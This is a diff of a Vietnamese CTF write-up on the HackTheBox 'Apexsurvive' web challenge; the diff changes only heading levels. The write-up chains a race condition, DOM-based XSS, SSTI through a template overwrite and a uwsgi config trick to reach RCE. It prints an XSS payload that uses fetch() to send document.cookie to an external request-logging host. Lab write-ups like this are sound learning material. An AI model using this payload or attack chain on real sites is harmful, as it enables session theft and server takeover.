@@ -11,9 +11,9 @@ image: cover.jpg
 Dạo này mình khá là hay viết wu các ctf challenge (chắc chắn không phải là do ngày trước mình lười), nó dường như đã tạo cho mình thói quen hàng tuần mình sẽ wu lại những challenge mình chơi và mình thấy hay và học được nhiều thứ từ nó. Câu lạc bộ mình tuần này có tham gia giải HTB - Cyber Apocalypse 2024, phải công nhận đây là một giải dài hơi và mình đã tốn tương đối thời gian cho các challenge web của giải này (cụ thể là 4 ngày) nhưng vẫn không thể solve được hết web challenge của giải, bản thân mình còn phải học hỏi rất nhiều nữa mới có thể hiểu và solve được dạng bài web cuối cùng nếu lần sau còn gặp lại. Giải đã kết thúc và cũng nhờ sự cố gắng, try hard của các anh em trong câu lạc bộ đến từ mọi mảng mà clb mình cũng đạt được thứ hạng mình nghĩ là khá cao , hehe.
 Lan man vậy cũng đủ rồi, sau đây sẽ là quá trình mình và các teamates trong KCSC đi giải các challenge web HTB, cũng như cách hiểu của mình về web chall đó. Let's go!!
 
-# 1. Apexsurvive 
+## Apexsurvive 
 ![image](https://hackmd.io/_uploads/BJWQ18b0p.png) 
-## Preface
+### Preface
 Đây là một chall white box nên mình download source về rồi dựng local khai thác cho nó tiện theo dõi, hehe :")))
 Sau khi dựng xong thì mình cũng phải khá choáng vì dockerfile của bài này những 70 dòng, nên mình tò mò đọc để nắm trước cần phải làm gì ở chall này
 ```dockerfile!
@@ -27,7 +27,7 @@ RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag && rm /readflag.c
 ```
 Docker như này là mình phải RCE để lấy flag rùi
 Chall có 2 service, 1 service web chính chạy python, và service email chạy js (và bot), nên mình nghĩ chắc sẽ có cả lỗ hổng client side và server side trong challenge này
-## Verify email token
+### Verify email token
 Vào chall thì mình được 'hướng dẫn' đăng kí với tên `test@email.htb` và để nhận được token email verify, nên cũng nhanh nhảu register và nhận được token ở endpoint `/email` khi đã vào account settings và chọn verify:
 ![image](https://hackmd.io/_uploads/HyQiJEmC6.png)
 Sau khi verify mình thấy có chức năng report và tham số truyền vào là ID của sản phẩm có tại `/challenge/home`(nghe mùi xss quá) 
@@ -43,7 +43,7 @@ def external():
     return redirect(url)
 ```
 Với việc cookie được set **samesite: strict**, mình nghĩ đến việc bypass Samesite Strict bằng redirect nên đã ngồi với thằng này cả buổi nhưng không có kết quả :cry:
-## Mò mẫm source code
+### Mò mẫm source code
 Sau khi tốn kha khá thời gian với thằng endpoint này mà không được kết quả gì, mình quyết định tạm thời bỏ qua và hướng đến các chức năng khác, có 2 chức năng đáng chú ý khi mình có thể lên được admin, đó là thêm sản phẩm/addItem và thêm contract/addContract.
 - Chức năng thêm sản phẩm có thể được sử dụng khi mình thỏa mãn **isInternal** (cụ thể là thuộc tính **isInternal** của user trong db là true) thì có thể sử dụng, addItem dùng để thêm một sản phẩm mới vào shop. Tuy nhiên thì các input cũng đã được sanitize chỉ cho phép nhập vào các tag và attribute nhất định được quy định trong `middlewares.py`
 ```python!
@@ -116,7 +116,7 @@ Tiếp tục đọc source, mình ngốn khoảng 1 buổi tiếp theo để ngh
 ```!
 2024-03-16 22:34:49 127.0.0.1 - - [16/Mar/2024 15:34:49] "GET /visit?productID=1&email=xclow3n@apexsurvive.htb&password=d8Bfk5Fw6oiROrxqrS2TmLc4NF1ZHU3r0OQfZSzbHna2DGljQbEmNG6st7uZ9QQ7 HTTP/1.1" 200 -
 ```
-## Exploit file upload
+### Exploit file upload
 Nói đến upload file python thì cách đầu tiên mình nghĩ đến là upload ghi đè file `__init__.py` nhưng web này lại không có nên hướng đi đó không khả thi cho lắm :cry:
 Vì mới gần đây có một bài upload python cũng na ná, teammate [MacHongNam](https://hackmd.io/@machongnam) đã gợi ý mình cách ghi đè file html và ssti trong file đó để khi server render_template sẽ trigger ssti để RCE. Điều kiện là file templates đó chưa được render lần nào, vì render_template sẽ ghi nhớ các lần render nên nếu render lỗi khả năng phải chạy lại docker làm lại là rất cao 
 Mình sẽ chọn templates `info.html` được render ở path `/` để inject -> trang chủ giới thiệu, chỉ cần lúc đầu mình truy cập thẳng vào path `/challenge` và `/email` là được
@@ -140,7 +140,7 @@ Khai thác thành công!!
 ![image](https://hackmd.io/_uploads/SJwvMBmAa.png)
 
 Tuy rằng đã có thể khai thác thành công, nhưng mình vẫn chưa tìm được cách nào để có thể lên được admin, cùng lúc này teammate [MacHongNam](https://hackmd.io/@machongnam) bảo mình hãy nghĩ cách để lên được **isInternal** nhằm sử dụng api /addItem, vì mình có thể dom based XSS tại endpoint /product/product-id
-## Bypass sanitized input to trigger XSS
+### Bypass sanitized input to trigger XSS
 Nghe như vậy thì mình đã tìm đến path addProduct để thêm sản phẩm, khi đọc đến `product.html` thì mình đã thấy vì sao có thể dom based XSS:
 ```javascript!
 <script>
@@ -156,7 +156,7 @@ Kết hợp với việc có thể report cho admin về các product, mình có
 ```javascript!
 `;fetch("https://9vja3pan.requestrepo.com/?"+document.cookie);//
 ```
-## Bypass isInternal with race condition 
+### Bypass isInternal with race condition 
 Tiếp tục vùi đầu vào đống source code, mình thấy được ở đoạn verifyEmail, email được tách ra thành tên và hostname, kiểu `a@gmail.com` thì tên là `a` và hostname là `gmail.com`. Nếu như hostname của mình là `apexsurvive.htb` thì database sẽ set **isInternal="true"**, đây chính là chỗ mình cần phải exploit
 ```python!
 def verifyEmail(token):
@@ -203,7 +203,7 @@ def sendVerification(decodedToken):
     return response('User already verified!')
 ```
 -> Có thể race condition save profile 2 email, đồng thời sendVerification để yêu cầu gửi token đến email, từ đó ghi đè nội dung server gửi cho `test@email.htb` thành của `test@apexsurvive.htb`, từ đó lấy token của email `test@apexsurvive.htb` đi verify là được **isInternal=true**.
-## Complete the attack chain & Exploit
+### Complete the attack chain & Exploit
 Các bước tấn công đã đầy đủ, nên mình sẽ tổng hợp lại như sau:
 - Race condition verify email -> bypass isInternal
 - Dom Based XSS tại /addProduct -> lấy session admin/ bypass admin
@@ -228,7 +228,7 @@ Mình làm y hệt như ở trên local và lụm được flag của challenge:
 - Flag: **HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}**
 
 P/s: Sau khi làm xong mình mới thấy là nếu như render ra pdf thì trang web sẽ bị lỗi và không lưu lại template đó nên mình có thể tiếp tục race mà không phải redeploy challenge.
-## Another workaround to bypass PDF upload
+### Another workaround to bypass PDF upload
 Sau khi đi tản mạn write up của mọi người, mình có tìm được bài write up này có một solution khác để trigger RCE thông qua upload file: https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/
 Đây là một cách rất hay khi server `uwsgi` dính lỗi arbitary PDF upload, cụ thể là nhằm vào file `uwgsi.ini` (Chi tiết ở document): https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html
 - `uwsgi` có khả năng đọc file config của chính nó kể cả khi file dưới dạng binary, miễn sao nó tìm được chuỗi bắt đầu khai báo config hợp lệ: `[uwsgi]`
